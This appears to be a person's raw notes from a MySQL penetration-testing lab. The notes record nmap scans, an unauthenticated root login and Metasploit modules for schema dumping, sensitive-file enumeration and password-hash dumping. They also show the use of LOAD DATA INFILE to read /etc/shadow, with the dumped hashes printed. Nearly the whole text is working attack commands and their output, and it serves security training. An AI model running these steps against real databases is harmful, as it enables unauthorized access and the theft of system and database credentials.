


nmap -p 3306 -sV -sC 192.243.183.3 # Version: 5.5.62-0ubuntu0.14.04.1

service mysql start

mysql -u root -h 192.243.183.3 

show databases; 
+--------------------+
| Database           |
+--------------------+
| information_schema |
| books              |
| data               |
| mysql              |
| password           |
| performance_schema |
| secret             |
| store              |
| upload             |
| vendors            |
| videos             |
+--------------------+

use books;  select count(*) from authors; 10
use auxiliary/scanner/mysql/mysql_schemadump ; set USERNAME root ; run
use auxiliary/scanner/mysql/mysql_writable_dirs # /tmp is writeable /root is writeable


use auxiliary/scanner/mysql/mysql_file_enum
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt

[+] 192.243.183.3:3306    - /etc/passwd is a file and exists
[+] 192.243.183.3:3306    - /etc/shadow is a file and exists
[+] 192.243.183.3:3306    - /etc/group is a file and exists
[+] 192.243.183.3:3306    - /etc/mysql/my.cnf is a file and exists
[+] 192.243.183.3:3306    - /etc/hosts is a file and exists
[+] 192.243.183.3:3306    - /etc/hosts.allow is a file and exists
[+] 192.243.183.3:3306    - /etc/hosts.deny is a file and exists
[+] 192.243.183.3:3306    - /etc/issue is a file and exists
[+] 192.243.183.3:3306    - /etc/fstab is a file and exists
[+] 192.243.183.3:3306    - /proc/version is a file and exists

use auxiliary/scanner/mysql/mysql_hashdump ; 
[+] 192.243.183.3:3306    - Saving HashString as Loot: root:
[+] 192.243.183.3:3306    - Saving HashString as Loot: root:
[+] 192.243.183.3:3306    - Saving HashString as Loot: root:
[+] 192.243.183.3:3306    - Saving HashString as Loot: root:
[+] 192.243.183.3:3306    - Saving HashString as Loot: debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
[+] 192.243.183.3:3306    - Saving HashString as Loot: root:
[+] 192.243.183.3:3306    - Saving HashString as Loot: filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.243.183.3:3306    - Saving HashString as Loot: ultra:*827EC562775DC9CE458689D36687DCED320F34B0
[+] 192.243.183.3:3306    - Saving HashString as Loot: guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.243.183.3:3306    - Saving HashString as Loot: sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.243.183.3:3306    - Saving HashString as Loot: udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.243.183.3:3306    - Saving HashString as Loot: sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14
[*] 192.243.183.3:3306    - Scanned 1 of 1 hosts (100% complete)

LOAD DATA INFILE "/etc/shadow" INTO TABLE  

MySQL [(none)]> use upload
MySQL [upload]> show tables;
Empty set (0.000 sec)
create table tmp ( text VARCHAR(400) NOT NULL );
LOAD DATA INFILE "/etc/shadow" INTO TABLE upload.tmp
    -> ;
Query OK, 22 rows affected (0.002 sec)
Records: 22  Deleted: 0  Skipped: 0  Warnings: 0

MySQL [upload]> SELECT * FROM tmp;
+-------------------------------------------------------------------------------------------------------------------------------+
| text                                                                                                                          |
+-------------------------------------------------------------------------------------------------------------------------------+
| root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::    |
| daemon:*:17850:0:99999:7:::                                                                                                   |
| bin:*:17850:0:99999:7:::                                                                                                      |
| sys:*:17850:0:99999:7:::                                                                                                      |
| sync:*:17850:0:99999:7:::                                                                                                     |
| games:*:17850:0:99999:7:::                                                                                                    |
| man:*:17850:0:99999:7:::                                                                                                      |
| lp:*:17850:0:99999:7:::                                                                                                       |
| mail:*:17850:0:99999:7:::                                                                                                     |
| news:*:17850:0:99999:7:::                                                                                                     |
| uucp:*:17850:0:99999:7:::                                                                                                     |
| proxy:*:17850:0:99999:7:::                                                                                                    |
| www-data:*:17850:0:99999:7:::                                                                                                 |
| backup:*:17850:0:99999:7:::                                                                                                   |
| list:*:17850:0:99999:7:::                                                                                                     |
| irc:*:17850:0:99999:7:::                                                                                                      |
| gnats:*:17850:0:99999:7:::                                                                                                    |
| nobody:*:17850:0:99999:7:::                                                                                                   |
| libuuid:!:17850:0:99999:7:::                                                                                                  |
| syslog:*:17850:0:99999:7:::                                                                                                   |
| mysql:!:17857:0:99999:7:::                                                                                                    |
| dbadmin:$6$vZ3Fv3x6$qdB/lOAC1EtlKEC2H8h5f7t33j65WDbHHV50jloFkxFBeQC8QkdbQKpHEp/BkVMQD2C2AFPkYW3.W7jMlMbl5.:17861:0:99999:7::: |
+-------------------------------------------------------------------------------------------------------------------------------+
22 rows in set (0.000 sec)

select user from mysql.user;
+------------------+
| user             |
+------------------+
| filetest         |
| root             |
| root             |
| root             |
| root             |
| debian-sys-maint |
| guest            |
| root             |
| sigver           |
| sysadmin         |
| udadmin          |
| ultra            |
+------------------+
12 rows in set (0.000 sec)

MySQL [upload]> select User,Password from mysql.user;
+------------------+-------------------------------------------+
| User             | Password                                  |
+------------------+-------------------------------------------+
| root             |                                           |
| root             |                                           |
| root             |                                           |
| root             |                                           |
| debian-sys-maint | *CDDA79A15EF590ED57BB5933ECD27364809EE90D |
| root             |                                           |
| filetest         | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |
| ultra            | *827EC562775DC9CE458689D36687DCED320F34B0 |
| guest            | *17FD2DDCC01E0E66405FB1BA16F033188D18F646 |
| sigver           | *027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0 |
| udadmin          | *E6DEAD2645D88071D28F004A209691AC60A72AC9 |
| sysadmin         | *46CFC7938B60837F46B610A2D10C248874555C14 |
+------------------+-------------------------------------------+

MySQL [upload]> select User,Password from mysql.user; 
No anonymous user as no blank user and password found above

nmap --script mysql-enum 192.243.183.3
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials



nmap -sV -sC 192.113.190.3
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.62-0ubuntu0.14.04.1
|   Thread ID: 50
|   Capabilities flags: 63487
|   Some Capabilities: ODBCClient, ConnectWithDatabase, SupportsCompression, SupportsLoadDataLocal, LongPassword, Speaks41ProtocolOld, Support41Auth, LongColumnFlag, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, SupportsTransactions, InteractiveClient, FoundRows, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: f0XKN(xF7|/of0[[56Pp
|_  Auth Plugin Name: 96
MAC Address: 02:42:C0:71:BE:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.75 seconds

interactiveclient -yes


​nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3

nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3

nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3

nmap --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/n selib/data/mysql-cis.audit'" -p 3306 192.71.145.3

​nmap --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''" -p 3306 192.71.145.3






















































